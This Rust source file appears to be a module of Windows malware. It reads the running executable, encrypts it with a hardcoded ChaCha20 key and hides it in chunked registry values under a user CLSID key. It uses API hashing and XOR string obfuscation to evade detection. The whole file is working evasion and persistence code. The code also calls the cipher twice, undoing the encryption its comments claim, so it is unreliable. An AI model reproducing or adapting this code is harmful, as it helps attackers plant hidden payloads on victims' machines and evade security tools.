//! # Registry Storage (Dynamic API) - HARDENED + ENCRYPTED
//!
//! Stores ChaCha20 encrypted payload in Registry using native API.
//! NO winreg crate = minimal import table.

use std::ffi::c_void;
use std::ptr;
use log::debug;
use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};

use super::api_resolver::{self, djb2};

// XOR Helper (Key 0x55)
fn x(bytes: &[u8]) -> String {
    let key = 0x55;
    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    String::from_utf8(decoded).unwrap_or_default()
}

// ChaCha20 Key (32 bytes) - XOR Obfuscated at compile time
// Actual key: "PryzrakMeshKey2026_SecretKey!@#$" XOR 0xAA
const CHACHA_KEY_ENC: [u8; 32] = [
    0xFA, 0xC2, 0xCB, 0xC4, 0xDE, 0xC5, 0xC7, 0xE7,
    0xCF, 0xD9, 0xC2, 0xE1, 0xCF, 0xD3, 0x98, 0x9A,
    0x98, 0x9C, 0xF5, 0xF9, 0xCF, 0xC9, 0xD8, 0xCF,
    0xDE, 0xE1, 0xCF, 0xD3, 0x8B, 0xEA, 0x89, 0x8E,
];

// Nonce: "PHMNONCE0001" XOR 0xAA
const CHACHA_NONCE_ENC: [u8; 12] = [0xFA, 0xE2, 0xE7, 0xE4, 0xE5, 0xE4, 0xE9, 0xEF, 0x9A, 0x9A, 0x9A, 0x9B];
const KEY_XOR: u8 = 0xAA;

/// Decode key at runtime
fn get_key() -> [u8; 32] {
    let mut k = CHACHA_KEY_ENC;
    for b in k.iter_mut() { *b ^= KEY_XOR; }
    k
}

fn get_nonce() -> [u8; 12] {
    let mut n = CHACHA_NONCE_ENC;
    for b in n.iter_mut() { *b ^= KEY_XOR; }
    n
}

// Registry API hashes
const HASH_REG_CREATE_KEY_EX_W: u32 = 0x9CB4594C;
const HASH_REG_SET_VALUE_EX_W: u32 = 0x02ACF196;
const HASH_REG_CLOSE_KEY: u32 = 0x66579AD4;
const HASH_ADVAPI32: u32 = 0x03C6B585;

// API Types
type RegCreateKeyExW = unsafe extern "system" fn(
    hKey: isize, lpSubKey: *const u16, Reserved: u32, lpClass: *const u16,
    dwOptions: u32, samDesired: u32, lpSecurityAttributes: *const c_void,
    phkResult: *mut isize, lpdwDisposition: *mut u32
) -> i32;

type RegSetValueExW = unsafe extern "system" fn(
    hKey: isize, lpValueName: *const u16, Reserved: u32, dwType: u32,
    lpData: *const u8, cbData: u32
) -> i32;

type RegCloseKey = unsafe extern "system" fn(hKey: isize) -> i32;

const HKEY_CURRENT_USER: isize = 0x80000001u32 as isize;
const KEY_ALL_ACCESS: u32 = 0xF003F;
const REG_SZ: u32 = 1;

/// Convert string to wide string for Windows API
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Simple base64 encode (no external crate)
fn base64_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    
    for chunk in data.chunks(3) {
        let n = match chunk.len() {
            3 => ((chunk[0] as u32) << 16) | ((chunk[1] as u32) << 8) | (chunk[2] as u32),
            2 => ((chunk[0] as u32) << 16) | ((chunk[1] as u32) << 8),
            1 => (chunk[0] as u32) << 16,
            _ => 0,
        };
        
        result.push(ALPHABET[((n >> 18) & 0x3F) as usize] as char);
        result.push(ALPHABET[((n >> 12) & 0x3F) as usize] as char);
        
        if chunk.len() > 1 {
            result.push(ALPHABET[((n >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        
        if chunk.len() > 2 {
            result.push(ALPHABET[(n & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }
    
    result
}

/// Read the current executable's bytes using native Windows API only.
/// Avoids std::fs::read() to minimize import table.
#[cfg(target_os = "windows")]
unsafe fn read_self_native() -> Result<Vec<u8>, String> {
    use api_resolver::*;
    
    // API types
    type GetModuleFileNameW = unsafe extern "system" fn(isize, *mut u16, u32) -> u32;
    type CreateFileW = unsafe extern "system" fn(*const u16, u32, u32, *const c_void, u32, u32, isize) -> isize;
    type GetFileSize = unsafe extern "system" fn(isize, *mut u32) -> u32;
    type ReadFile = unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *const c_void) -> i32;
    type CloseHandle = unsafe extern "system" fn(isize) -> i32;
    
    // Resolve APIs
    let get_module_file_name: GetModuleFileNameW = resolve_api(HASH_KERNEL32, djb2(b"GetModuleFileNameW"))
        .ok_or("E30")?;
    let create_file: CreateFileW = resolve_api(HASH_KERNEL32, HASH_CREATE_FILE_W)
        .ok_or("E31")?;
    let get_file_size: GetFileSize = resolve_api(HASH_KERNEL32, djb2(b"GetFileSize"))
        .ok_or("E32")?;
    let read_file: ReadFile = resolve_api(HASH_KERNEL32, HASH_READ_FILE)
        .ok_or("E33")?;
    let close_handle: CloseHandle = resolve_api(HASH_KERNEL32, HASH_CLOSE_HANDLE)
        .ok_or("E34")?;
    
    // Get current executable path
    let mut path_buf = [0u16; 260];
    let len = get_module_file_name(0, path_buf.as_mut_ptr(), 260);
    if len == 0 { return Err("E35".to_string()); }
    
    // Open file for reading
    // GENERIC_READ=0x80000000, FILE_SHARE_READ=1, OPEN_EXISTING=3
    let handle = create_file(path_buf.as_ptr(), 0x80000000, 1, ptr::null(), 3, 0, 0);
    if handle == -1 { return Err("E36".to_string()); }
    
    // Get file size
    let size = get_file_size(handle, ptr::null_mut());
    if size == 0xFFFFFFFF { 
        close_handle(handle);
        return Err("E37".to_string()); 
    }
    
    // Read file
    let mut buffer = vec![0u8; size as usize];
    let mut bytes_read: u32 = 0;
    let result = read_file(handle, buffer.as_mut_ptr(), size, &mut bytes_read, ptr::null());
    close_handle(handle);
    
    if result == 0 { return Err("E38".to_string()); }
    if bytes_read != size { buffer.truncate(bytes_read as usize); }
    
    Ok(buffer)
}

/// Install the current executable blob into Registry (Encrypted)
/// Uses NATIVE API only - no winreg crate, no std::fs
pub fn install_self_to_registry() -> Result<String, String> {
    #[cfg(target_os = "windows")]
    unsafe {

        // Read current executable using native API
        crate::k::debug::log_detail!("Reading self (native)...");
        let data = read_self_native()?;
        let mut data = data; // Make mutable for encryption
        crate::k::debug::log_detail!("Read {} bytes", data.len());

        // Encrypt with ChaCha20 (key decoded at runtime)
        let key = get_key();
        let nonce = get_nonce();
        let mut cipher = ChaCha20::new((&key).into(), (&nonce).into());
        cipher.apply_keystream(&mut data);

        cipher.apply_keystream(&mut data);
        
        crate::k::debug::log_hex!("Encrypted Payload (First 16b)", data);

        // Base64 encode
        let b64_data = base64_encode(&data);

        // Build registry path (XOR obfuscated)
        let clsid = "{e403d151-54b0-466d-8958-69225785f78a}";
        let p1 = x(&[0x06, 0x3A, 0x33, 0x21, 0x22, 0x34, 0x27, 0x30]); // Software
        let p2 = x(&[0x16, 0x39, 0x34, 0x26, 0x26, 0x30, 0x26]);       // Classes
        let p3 = x(&[0x16, 0x19, 0x06, 0x1C, 0x11]);                   // CLSID
        
        let path = format!("{}\\{}\\{}\\{}", p1, p2, p3, clsid);
        crate::k::debug::log_op!("Registry", format!("Target Key: HKCU\\{}", path));
        let path_wide = to_wide(&path);

        // Resolve Registry APIs from advapi32.dll
        let advapi32 = api_resolver::get_module_by_hash(HASH_ADVAPI32);
        if advapi32.is_none() {
            // advapi32 might not be loaded, try loading it
            type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *const c_void;
            let load_lib: LoadLibraryA = api_resolver::resolve_api(
                api_resolver::HASH_KERNEL32, 
                api_resolver::HASH_LOAD_LIBRARY_A
            ).ok_or("E10")?;
            
            // Obfuscated "advapi32.dll\0"
            let dll_enc: [u8; 13] = [0x34, 0x31, 0x23, 0x34, 0x27, 0x3C, 0x66, 0x67, 0x7B, 0x31, 0x3B, 0x3B, 0x55];
            let dll_name: Vec<u8> = dll_enc.iter().map(|b| b ^ 0x55).collect();
            load_lib(dll_name.as_ptr());
        }
        
        let advapi32 = api_resolver::get_module_by_hash(HASH_ADVAPI32)
            .ok_or("E11")?;

        let reg_create: RegCreateKeyExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_CREATE_KEY_EX_W)
            .map(|p| std::mem::transmute(p))
            .ok_or("E12")?;
            
        let reg_set: RegSetValueExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_SET_VALUE_EX_W)
            .map(|p| std::mem::transmute(p))
            .ok_or("E13")?;
            
        let reg_close: RegCloseKey = api_resolver::get_export_by_hash(advapi32, HASH_REG_CLOSE_KEY)
            .map(|p| std::mem::transmute(p))
            .ok_or("E14")?;

        // Create registry key
        let mut hkey: isize = 0;
        let mut disposition: u32 = 0;
        
        let status = reg_create(
            HKEY_CURRENT_USER,
            path_wide.as_ptr(),
            0,
            ptr::null(),
            0,
            KEY_ALL_ACCESS,
            ptr::null(),
            &mut hkey,
            &mut disposition
        );
        
        if status != 0 {
            crate::k::debug::log_err!(format!("RegCreateKeyExW failed: {}", status));
            return Err(format!("E39:{}", status));
        }

        // Convert base64 string to wide string for REG_SZ
        // SPLIT PAYLOAD FIX: Chunk size 500KB
        let chunk_size = 500 * 1024; 
        // Base64 string is ASCII, so byte offset works fine.
        let total_len = b64_data.len();
        let mut offset = 0;
        let mut index = 0;
        
        crate::k::debug::log_detail!("Writing Payload (Total: {} bytes) in chunks...", total_len);
        
        while offset < total_len {
            let end = std::cmp::min(offset + chunk_size, total_len);
            let chunk = &b64_data[offset..end];
            
            // Name: Payload, Payload1, Payload2...
            let val_name_str = if index == 0 {
                x(&[0x05, 0x34, 0x2C, 0x39, 0x3A, 0x34, 0x31]) // Payload
            } else {
                format!("{}{}", x(&[0x05, 0x34, 0x2C, 0x39, 0x3A, 0x34, 0x31]), index)
            };
            
            let val_name_wide = to_wide(&val_name_str);
            let chunk_wide = to_wide(chunk);
            
            crate::k::debug::log_detail!("Writing Chunk {} ({} bytes)...", index, chunk.len());
            
            let status = reg_set(
                hkey,
                val_name_wide.as_ptr(),
                0,
                REG_SZ,
                chunk_wide.as_ptr() as *const u8,
                (chunk_wide.len() * 2) as u32
            );
            
            if status != 0 {
                crate::k::debug::log_err!(format!("Chunk {} Write Fail: {}", index, status));
                reg_close(hkey);
                return Err(format!("E40:{}", status));
            }
            
            offset = end;
            index += 1;
        }
        
        crate::k::debug::log_detail!("All Chunks Written Successfully.");
        reg_close(hkey);


        
        Ok(path)
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        Err("Registry operations only supported on Windows".to_string())
    }
}
